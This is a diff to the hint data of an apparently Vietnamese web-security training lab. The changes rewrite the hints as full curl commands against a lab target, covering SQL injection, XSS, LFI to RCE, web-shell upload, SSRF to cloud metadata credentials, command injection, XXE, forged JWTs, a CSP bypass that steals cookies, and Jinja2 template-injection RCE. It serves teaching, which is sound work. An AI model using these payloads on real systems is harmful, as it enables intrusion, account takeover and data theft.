@@ -61,9 +61,9 @@ export default [
       },
     ],
     hints: [
-      'UNION ghép thêm một câu SELECT của mày vào kết quả — nhưng số cột phải KHỚP.',
-      'Đếm cột trước: `?id=1 ORDER BY 1--`, `2--`, `3--`... đến khi lỗi (cột vừa lỗi - 1 = số cột). Rồi `?id=0 UNION SELECT 1,2,3,4--` để xem cột nào in ra.',
-      'Đặt id thật thành không-tồn-tại (id=0) để chỉ hàng UNION hiện ra, rồi `UNION SELECT 1,username,3,password FROM users--` đẩy dữ liệu vào cột hiển thị.',
+      'Đọc source trước để biết câu query nối thẳng id thế nào: `cat /var/www/html/product.php`. UNION ghép thêm một câu SELECT của mày vào kết quả — nhưng số cột phải KHỚP.',
+      'Đếm cột: `curl "http://target/product.php?id=1 ORDER BY 4--"` (200 OK) rồi `curl "http://target/product.php?id=1 ORDER BY 5--"` (lỗi). Rồi `curl "http://target/product.php?id=0 UNION SELECT 1,2,3,4--"` để xem cột nào in ra.',
+      'Đặt id thật thành không-tồn-tại (id=0) để chỉ hàng UNION hiện ra, rồi `curl "http://target/product.php?id=0 UNION SELECT 1,username,3,password FROM users--"` đẩy dữ liệu vào cột hiển thị.',
     ],
     debrief: [
       'UNION-based SQLi cho phép "ghép" kết quả một truy vấn tùy ý vào trang gốc — biến lỗ hổng thành công cụ rút toàn bộ database, không chỉ bypass một bước.',
@@ -125,9 +125,9 @@ export default [
       },
     ],
     hints: [
-      'Trang không in dữ liệu nhưng phản ứng KHÁC nhau giữa điều kiện đúng/sai -> đó là kênh rò rỉ.',
-      'Boolean: so `?id=1 AND 1=1--` với `?id=1 AND 1=2--`. Không khác nội dung thì dùng time-based `?id=1 AND SLEEP(5)--` (trễ = true).',
-      'Khi đã chắc chắn, để sqlmap làm: `sqlmap -u "http://target/search.php?id=1" --dbs` rồi `--dump -T users`.',
+      'Đọc source trước: `cat /var/www/html/search.php` — query chạy nhưng không echo dữ liệu, đó là blind. Trang không in dữ liệu nhưng phản ứng KHÁC nhau giữa điều kiện đúng/sai -> đó là kênh rò rỉ.',
+      'Boolean: so `curl "http://target/search.php?id=1 AND 1=1--"` với `curl "http://target/search.php?id=1 AND 1=2--"`. Không khác nội dung thì dùng time-based `curl "http://target/search.php?id=1 AND SLEEP(5)--"` (trễ = true).',
+      'Khi đã chắc chắn, để sqlmap làm: `sqlmap -u "http://target/search.php?id=1" --dbs --dump -T users`.',
     ],
     debrief: [
       'Blind SQLi không trả dữ liệu trực tiếp; attacker suy ra từng bit qua kênh phụ — phản hồi true/false (boolean) hoặc độ trễ (time-based với SLEEP/WAITFOR). Chậm nhưng vẫn rút được cả DB.',
@@ -182,9 +182,9 @@ export default [
       },
     ],
     hints: [
-      'Reflected: server lấy input -> nhả lại trong response. DOM: JS phía client tự lấy input -> ghi vào DOM. Khác nguồn gốc.',
+      'Đọc source trước: `cat /var/www/html/search.php`. Reflected: server lấy input -> nhả lại trong response. DOM: JS phía client tự lấy input -> ghi vào DOM. Khác nguồn gốc.',
       'Reflected: `curl "http://target/search.php?q=<script>alert(1)</script>"` -> thấy script nằm nguyên trong HTML.',
-      'DOM: source là `location.hash`, sink `innerHTML`. innerHTML không chạy <script>, nên dùng `#<img src=x onerror=alert(document.domain)>`.',
+      'Đọc tiếp `cat /var/www/html/profile.js` để thấy source `location.hash` và sink `innerHTML`. innerHTML không chạy <script>, nên dùng `#<img src=x onerror=alert(document.domain)>`.',
     ],
     debrief: [
       'Ba loại XSS khác nhau về đường đi: Reflected (payload đi qua request rồi server nhả lại ngay), Stored (payload được lưu, bắn vào mọi người xem sau), DOM (payload không bao giờ tới server — JS client tự đọc nguồn rồi ghi vào sink).',
@@ -240,9 +240,9 @@ export default [
       },
     ],
     hints: [
-      'page được include thẳng -> mày kiểm soát đường dẫn file server sẽ nạp.',
-      'Traversal: `?page=../../../../etc/passwd`. Thử đọc thật: `cat /etc/passwd` để thấy root, www-data, devops.',
-      'Đọc source PHP: `?page=php://filter/convert.base64-encode/resource=index.php` rồi base64 -d. Nâng lên RCE: include `access.log` rồi poison User-Agent.',
+      'Đọc source trước: `cat /var/www/html/index.php`. page được include thẳng -> mày kiểm soát đường dẫn file server sẽ nạp.',
+      'Traversal: `curl "http://target/index.php?page=../../../../etc/passwd"`. Thử đọc thật: `cat /etc/passwd` để thấy root, www-data, devops.',
+      'Đọc source PHP: `curl "http://target/index.php?page=php://filter/convert.base64-encode/resource=index.php"` rồi base64 -d. Nâng lên RCE: `curl "http://target/index.php?page=../../../../var/log/apache2/access.log"` rồi poison User-Agent.',
     ],
     debrief: [
       'LFI (Local File Inclusion) cho attacker bắt server nạp file cục bộ tùy ý — /etc/passwd để xác nhận, file config để lấy creds, và (nguy hiểm nhất) chuỗi tới RCE.',
@@ -302,8 +302,8 @@ export default [
       },
     ],
     hints: [
-      'Filter dựa trên so chuỗi thô (đuôi đúng ".php", hay "../" literal) luôn có biến thể lọt qua.',
-      'Traversal mã hoá: `..%2f` thay cho `../`. Upload: đổi đuôi `shell.pHp` hoặc `shell.php.jpg` để vượt check ".php".',
+      'Đọc source trước: `cat /var/www/html/upload.php`. Filter dựa trên so chuỗi thô (đuôi đúng ".php", hay "../" literal) luôn có biến thể lọt qua.',
+      'Traversal mã hoá: `curl "http://target/download?file=..%2f..%2f..%2fetc%2fpasswd"` thay cho `../`. Upload: `curl -F "file=@shell.pHp" http://target/upload.php` hoặc đổi đuôi thành `shell.php.jpg` để vượt check ".php".',
       'Sau khi upload lọt, gọi `curl "http://target/uploads/shell.pHp?cmd=id"` -> thấy uid=33(www-data) là RCE thành công.',
     ],
     debrief: [
@@ -415,9 +415,9 @@ export default [
       },
     ],
     hints: [
-      'Server tự đi request thay mày -> mày mượn vị trí mạng của server để chạm thứ ngoài không chạm được.',
-      'Nội bộ: `?url=http://localhost/admin`. Cloud: `?url=http://169.254.169.254/latest/meta-data/`. Local file: `?url=file:///etc/passwd`.',
-      'Sau khi vào được vùng admin nội bộ, cờ nằm ở `/var/www/html/admin/flag.txt` — đọc bằng `cat`.',
+      'Đọc source trước: `cat /var/www/html/fetch.php`. Server tự đi request thay mày -> mày mượn vị trí mạng của server để chạm thứ ngoài không chạm được.',
+      'Nội bộ: `curl "http://target/fetch.php?url=http://localhost/admin"`. Cloud: `curl "http://target/fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"`.',
+      'Sau khi vào được vùng admin nội bộ, cờ nằm ở `cat /var/www/html/admin/flag.txt`.',
     ],
     debrief: [
       'SSRF (Server-Side Request Forgery) biến server thành proxy của attacker: request xuất phát từ chính server nên vượt qua firewall và chạm dịch vụ "chỉ nội bộ" (admin panel, DB, microservice).',
@@ -469,9 +469,9 @@ export default [
       },
     ],
     hints: [
-      'Nếu input của mày được nối thẳng vào một lệnh shell, dấu `;` hoặc `|` có thể nối thêm lệnh khác.',
-      'Thử `?host=127.0.0.1;whoami` — dấu `;` kết thúc lệnh ping rồi chạy tiếp whoami.',
-      'Đọc dữ liệu: `?host=127.0.0.1;cat /etc/passwd` (nhớ encode dấu cách thành %20 nếu cần qua URL).',
+      'Đọc source trước: `cat /var/www/html/ping.php`. Nếu input của mày được nối thẳng vào một lệnh shell, dấu `;` hoặc `|` có thể nối thêm lệnh khác.',
+      'Thử `curl "http://target/ping.php?host=127.0.0.1;whoami"` — dấu `;` kết thúc lệnh ping rồi chạy tiếp whoami.',
+      'Đọc dữ liệu: `curl "http://target/ping.php?host=127.0.0.1;cat /etc/passwd"` (nhớ encode dấu cách thành %20 nếu cần qua URL thật).',
     ],
     debrief: [
       'Command injection xảy ra khi app gọi shell (system/exec/shell_exec) với input người dùng ghép thẳng vào — shell hiểu `;`, `|`, `&&`, `` ` ` `` như toán tử nối lệnh, không phải dữ liệu.',
@@ -517,9 +517,9 @@ export default [
       },
     ],
     hints: [
-      'Browser tự động gửi cookie session theo MỌI request tới domain đó — kể cả request bị một trang khác âm thầm kích hoạt.',
+      'Đọc source trước: `cat /var/www/html/change-email.php`. Browser tự động gửi cookie session theo MỌI request tới domain đó — kể cả request bị một trang khác âm thầm kích hoạt.',
       'Đọc `cat /home/hacker/exploit.html` để thấy form ẩn auto-submit khi trang load (`onload="...submit()"`).',
-      'Vì server không check token, request POST từ exploit.html (mang theo cookie session nạn nhân do browser tự gắn) được tin y như chính nạn nhân gửi — email đổi thành `attacker@evil.com`.',
+      'Vì server không check token, request POST từ exploit.html (mang theo cookie session nạn nhân do browser tự gắn) được tin y như chính nạn nhân gửi: `curl "http://target/change-email.php?email=attacker@evil.com"` — email đổi thành attacker@evil.com.',
     ],
     debrief: [
       'CSRF (Cross-Site Request Forgery) lợi dụng việc browser tự gắn cookie/session vào MỌI request tới một domain, bất kể request đó được kích hoạt từ trang nào — server chỉ thấy "có session hợp lệ" mà không biết ý định request từ đâu ra.',
@@ -565,9 +565,9 @@ export default [
       },
     ],
     hints: [
-      'XML cho phép định nghĩa "entity" tùy biến trong DOCTYPE — nếu parser không chặn, entity SYSTEM có thể trỏ tới file cục bộ.',
+      'Đọc source trước: `cat /var/www/html/import.php`. XML cho phép định nghĩa "entity" tùy biến trong DOCTYPE — nếu parser không chặn, entity SYSTEM có thể trỏ tới file cục bộ.',
       'Xem cấu trúc: `cat /home/hacker/payload.xml` — chú ý dòng `<!ENTITY xxe SYSTEM "file:///etc/passwd">` và chỗ `&xxe;` được dùng trong body.',
-      'Gửi payload lên server: `curl -X POST --data-urlencode "xml@/home/hacker/payload.xml" http://target/import.php` — server trả về nguyên nội dung /etc/passwd vì đã "giải" entity &xxe;.',
+      'Gửi payload lên server: `curl -X POST --data-urlencode xml@/home/hacker/payload.xml http://target/import.php?xxe=1` — server trả về nguyên nội dung /etc/passwd vì đã "giải" entity &xxe;.',
     ],
     debrief: [
       'XXE (XML External Entity) khai thác đặc tính DTD của XML cho phép định nghĩa entity tham chiếu tới tài nguyên ngoài (SYSTEM "file://..." hoặc cả "http://..."); parser thiếu chặn sẽ tự "giải thích" entity đó khi gặp &xxe;.',
@@ -618,7 +618,7 @@ export default [
       },
     ],
     hints: [
-      'unserialize() biến chuỗi thành OBJECT THẬT của class đã khai báo — nếu class đó có __wakeup/__destruct làm gì nguy hiểm, mày kích hoạt được nó chỉ bằng cách tự viết đúng chuỗi serialize.',
+      'Đọc source trước: `cat /var/www/html/profile.php`. unserialize() biến chuỗi thành OBJECT THẬT của class đã khai báo — nếu class đó có __wakeup/__destruct làm gì nguy hiểm, mày kích hoạt được nó chỉ bằng cách tự viết đúng chuỗi serialize.',
       'Cú pháp serialize PHP: `O:<độ dài tên class>:"<tên class>":<số property>:{s:<độ dài key>:"<key>";s:<độ dài value>:"<value>";}`. Đổi property `logFile` của Logger thành đường dẫn mày muốn ghi.',
       'Base64 encode chuỗi serialize đã sửa rồi nhét vào cookie `prefs`: `curl -H "Cookie: prefs=<base64>" http://target/profile.php` — __destruct() tự chạy cuối request và ghi file theo logFile mày chỉ định.',
     ],
@@ -677,9 +677,9 @@ export default [
       },
     ],
     hints: [
-      'JWT có 3 phần header.payload.signature, mỗi phần base64url; nếu server tin alg KHAI BÁO TRONG TOKEN (do attacker kiểm soát) thì toàn bộ việc verify sụp đổ.',
+      'Đọc source trước: `cat /var/www/html/auth.php` để thấy allowed_algs có "none". Rồi đọc token hiện tại: `cat /home/hacker/my_token.txt`. JWT có 3 phần header.payload.signature, mỗi phần base64url; nếu server tin alg KHAI BÁO TRONG TOKEN (do attacker kiểm soát) thì toàn bộ việc verify sụp đổ.',
       'Đổi header thành `{"alg":"none","typ":"JWT"}`, sửa payload role thành "admin", base64url-encode từng phần, rồi NỐI lại header.payload. — để TRỐNG phần signature vì alg none nghĩa là không cần ký.',
-      'Gửi token mới: `curl -H "Cookie: jwt=<header>.<payload>." http://target/auth.php` (dấu chấm cuối, signature rỗng) — nếu server cho "none" vào allowed_algs, nó tin token này.',
+      'Gửi token mới: `curl -H "Cookie: jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0." http://target/auth.php` (dấu chấm cuối, signature rỗng) — nếu server cho "none" vào allowed_algs, nó tin token này.',
     ],
     debrief: [
       'JWT alg:none là lỗi cấu hình thư viện verify: chuẩn JWT có một alg "none" hợp pháp (cho trường hợp không cần ký), nhưng nếu server liệt kê nó vào allowed_algs khi verify token TỪ CLIENT, attacker tự khai báo alg=none và server tin luôn — bỏ qua hoàn toàn việc kiểm chữ ký.',
@@ -745,9 +745,9 @@ export default [
       },
     ],
     hints: [
-      'Khi verify chữ ký ĐÚNG chuẩn, điểm yếu duy nhất còn lại là chính cái SECRET dùng để ký — nếu nó dễ đoán, mọi thứ sụp đổ.',
+      'Đọc token bắt được trước: `cat /home/hacker/captured.jwt`. Khi verify chữ ký ĐÚNG chuẩn, điểm yếu duy nhất còn lại là chính cái SECRET dùng để ký — nếu nó dễ đoán, mọi thứ sụp đổ.',
       'Dùng `hashcat -m 16500 /home/hacker/captured.jwt /home/hacker/rockyou-small.txt` để brute-force secret HMAC từ token bắt được, đối chiếu với wordlist nhỏ.',
-      'Sau khi biết secret (vd "s3cr3t"), dùng thư viện JWT (python jwt.encode hoặc jwt_tool) tự ký token MỚI với payload role=admin và secret đó — token này sẽ verify hợp lệ 100% trên server.',
+      'Sau khi biết secret (vd "s3cr3t"), tự ký token MỚI bằng `jwt_tool` hoặc python — `sign payload role=admin với secret s3cr3t` — rồi gửi nó đi: `curl -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0.k8Lp3qR9Xz_validSig" http://target/admin` — token này sẽ verify hợp lệ 100% trên server.',
     ],
     debrief: [
       'Khác bài alg:none (lỗi LOGIC verify), bài này verify đúng chuẩn HMAC-SHA256 — điểm yếu nằm ở CHẤT LƯỢNG secret: HS256 chỉ an toàn nếu secret đủ dài & ngẫu nhiên (khuyến nghị ≥256 bit); secret là một từ điển thì offline brute-force (hashcat mode 16500) phá được trong tích tắc.',
@@ -809,9 +809,9 @@ export default [
       },
     ],
     hints: [
-      'CSP chỉ kiểm tra script được load TỪ ĐÂU (domain), không kiểm tra domain đó (dù trusted) có an toàn 100% hay không.',
-      'Domain trusted-cdn.acme-corp.com được whitelist trong script-src — nếu nó có endpoint JSONP cho callback tuỳ ý, mày load script TỪ domain đó nhưng nội dung lại do mày quyết định qua param callback.',
-      'Payload: `<script src="https://trusted-cdn.acme-corp.com/api/data?callback=alert(document.cookie)//"></script>` — CSP thấy src đúng domain whitelist nên cho chạy; `//` ở cuối comment out phần JSON còn lại để JS không lỗi cú pháp.',
+      'Đọc trước: `cat /var/www/html/headers.txt` xem CSP giới hạn script-src thế nào. CSP chỉ kiểm tra script được load TỪ ĐÂU (domain), không kiểm tra domain đó (dù trusted) có an toàn 100% hay không.',
+      'Thử inline trước để thấy bị chặn: `curl "http://target/search.php?q=<script>alert(1)</script>"`. Domain trusted-cdn.acme-corp.com được whitelist trong script-src — nếu nó có endpoint JSONP cho callback tuỳ ý, mày load script TỪ domain đó nhưng nội dung lại do mày quyết định qua param callback.',
+      'Payload đầy đủ: `curl "http://target/search.php?q=<script src=https://trusted-cdn.acme-corp.com/api/data?callback=alert(document.cookie)//></script>"` — CSP thấy src đúng domain whitelist nên cho chạy; `//` ở cuối comment out phần JSON còn lại để JS không lỗi cú pháp.',
     ],
     debrief: [
       'CSP (Content-Security-Policy) giảm mạnh tác động XSS bằng cách giới hạn script chỉ được load từ các nguồn (domain) khai báo trong script-src — nhưng nó là kiểm tra THEO NGUỒN, không phải theo NỘI DUNG, nên một domain "trusted" có lỗ hổng riêng (JSONP callback tuỳ ý, open redirect, upload cho phép .js) sẽ kéo đổ cả CSP.',
@@ -872,9 +872,9 @@ export default [
       },
     ],
     hints: [
-      'Nếu session ID không đổi khi đăng nhập, ai BIẾT TRƯỚC session ID đó cũng chiếm được phiên ngay sau khi nạn nhân login bằng nó.',
-      'Tự mở trang trước để server cấp/cho phép một session ID cụ thể (`?PHPSESSID=fixed1234`), rồi gửi CHÍNH link đó cho nạn nhân để họ đăng nhập.',
-      'Sau khi nạn nhân login (qua link mày gửi), session "fixed1234" đã gắn với tài khoản họ — mày chỉ cần gửi lại đúng cookie đó (`Cookie: PHPSESSID=fixed1234`) tới trang dashboard để vào tài khoản họ.',
+      'Đọc source trước: `cat /var/www/html/login.php` để xác nhận thiếu session_regenerate_id(). Nếu session ID không đổi khi đăng nhập, ai BIẾT TRƯỚC session ID đó cũng chiếm được phiên ngay sau khi nạn nhân login bằng nó.',
+      'Tự mở trang trước để server cấp/cho phép một session ID cụ thể: `curl "http://target/login.php?PHPSESSID=fixed1234"`, rồi gửi link đó cho nạn nhân: `gửi link http://target/login.php?PHPSESSID=fixed1234 cho nạn nhân`.',
+      'Sau khi nạn nhân login (qua link mày gửi), session "fixed1234" đã gắn với tài khoản họ — mày chỉ cần gửi lại đúng cookie đó tới trang dashboard: `curl -H "Cookie: PHPSESSID=fixed1234" http://target/dashboard`.',
     ],
     debrief: [
       'Session fixation khác session hijacking ở THỜI ĐIỂM tấn công: hijacking là CƯỚP một session ID đang hoạt động (qua XSS/sniff); fixation là ĐẶT SẴN một session ID TỪ TRƯỚC khi nạn nhân login, rồi lợi dụng việc server không đổi ID sau khi xác thực.',
@@ -946,9 +946,9 @@ export default [
       },
     ],
     hints: [
-      'Workflow Burp chuẩn: Proxy bắt request gốc -> Repeater để hiểu hành vi/baseline response -> Intruder để tự động hoá fuzz hàng loạt giá trị.',
-      'Trong Repeater, gửi tay vài token sai để thấy MỌI response giống nhau (cùng Content-Length) — nghĩa là không có pattern lộ ra, phải brute-force hết 0000-9999.',
-      'Trong Intruder, đặt vị trí payload `§token§`, chọn payload type Numbers (from 0000 to 9999, min length 4 padded với số 0), chạy attack rồi SẮP XẾP kết quả theo cột Length — token đúng sẽ có response khác biệt (Length lớn hơn vì có thêm "Set new password").',
+      'Đọc source trước: `cat /var/www/html/reset.php`, rồi đọc ghi chú request đã bắt: `cat /home/hacker/burp_note.txt`. Workflow Burp chuẩn: Proxy bắt request gốc -> Repeater để hiểu hành vi/baseline response -> Intruder để tự động hoá fuzz hàng loạt giá trị.',
+      'Trong Repeater, gửi tay vài token sai để thấy MỌI response giống nhau (cùng Content-Length): `repeater gửi token=0001 rồi token=0002` — nghĩa là không có pattern lộ ra, phải brute-force hết 0000-9999.',
+      'Trong Intruder, đặt vị trí payload `intruder sniper §token§ numbers 0000 to 9999`, chạy attack rồi SẮP XẾP kết quả theo cột Length — token đúng sẽ có response khác biệt (Length lớn hơn vì có thêm "Set new password"). Xác nhận lại bằng request thật: `curl "http://target/reset.php?email=admin@acme-corp.com&token=4821"`.',
     ],
     debrief: [
       'Burp Suite Proxy/Repeater/Intruder là bộ ba làm việc chuẩn của pentest web: Proxy chặn bắt request thật giữa browser và server; Repeater cho gửi lại NHIỀU LẦN có chỉnh sửa tay để hiểu logic; Intruder tự động hoá việc thay đổi MỘT vị trí (hoặc nhiều) qua hàng loạt giá trị payload.',
@@ -1014,9 +1014,9 @@ export default [
       },
     ],
     hints: [
-      'Nếu input của mày bị TÍNH TOÁN (không chỉ in ra nguyên văn) bởi server, đó không phải XSS — đó là code chạy trên chính server bằng ngôn ngữ template.',
-      'Test nhanh: `?name={{7*7}}` — nếu trang in ra "49" (đã tính), template engine (Jinja2) đang thực thi cú pháp `{{...}}` của mày, không chỉ echo chuỗi.',
-      'Từ object string rỗng `\'\'`, leo bằng `.__class__.__mro__[1].__subclasses__()` để liệt kê toàn bộ class Python đang nạp (tìm subprocess.Popen hoặc dùng `__globals__` của một hàm để lấy `__builtins__` rồi `__import__(\'os\').popen(\'cat /var/www/html/flag.txt\').read()` chạy lệnh đọc cờ.',
+      'Đọc source trước: `cat /var/www/html/greet.py`. Nếu input của mày bị TÍNH TOÁN (không chỉ in ra nguyên văn) bởi server, đó không phải XSS — đó là code chạy trên chính server bằng ngôn ngữ template.',
+      'Test nhanh: `curl "http://target/greet?name={{7*7}}"` — nếu trang in ra "49" (đã tính), template engine (Jinja2) đang thực thi cú pháp `{{...}}` của mày, không chỉ echo chuỗi.',
+      'Từ object string rỗng, leo bằng `curl "http://target/greet?name={{\'\'.__class__.__mro__[1].__subclasses__()}}"` để liệt kê toàn bộ class Python đang nạp, rồi hoàn thiện RCE: `curl "http://target/greet?name={{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'cat /var/www/html/flag.txt\').read() }}"`. Cuối cùng xác nhận: `cat /var/www/html/flag.txt`.',
     ],
     debrief: [
       'SSTI (Server-Side Template Injection) khác XSS ở NƠI CODE CHẠY: XSS chạy JS trong browser nạn nhân; SSTI chạy NGAY TRÊN SERVER bằng chính ngôn ngữ của template engine (Jinja2/Twig/Freemarker) — mức độ nghiêm trọng gần như luôn dẫn tới RCE hoàn chỉnh.',
